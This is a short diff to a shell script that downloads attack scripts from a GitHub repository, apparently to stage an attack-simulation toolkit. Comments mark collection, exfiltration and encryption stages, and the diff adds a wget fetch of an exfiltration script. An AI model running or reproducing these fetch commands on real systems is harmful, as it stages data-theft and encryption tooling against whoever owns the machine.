@@ -15,6 +15,7 @@ wget https://raw.githubusercontent.com/S692/ossas/main/attackScripts/file_and_di
 wget https://raw.githubusercontent.com/S692/ossas/main/attackScripts/collectiontarget.sh
 # Exfiltration
 wget https://raw.githubusercontent.com/S692/ossas/main/attackScripts/exfiltration_attk.sh
+wget https://raw.githubusercontent.com/S692/ossas/main/attackScripts/exfiltration_target.sh
 # Encryption
 wget https://raw.githubusercontent.com/S692/ossas/main/attackScripts/encryption/check.sh
 # Chmod execute
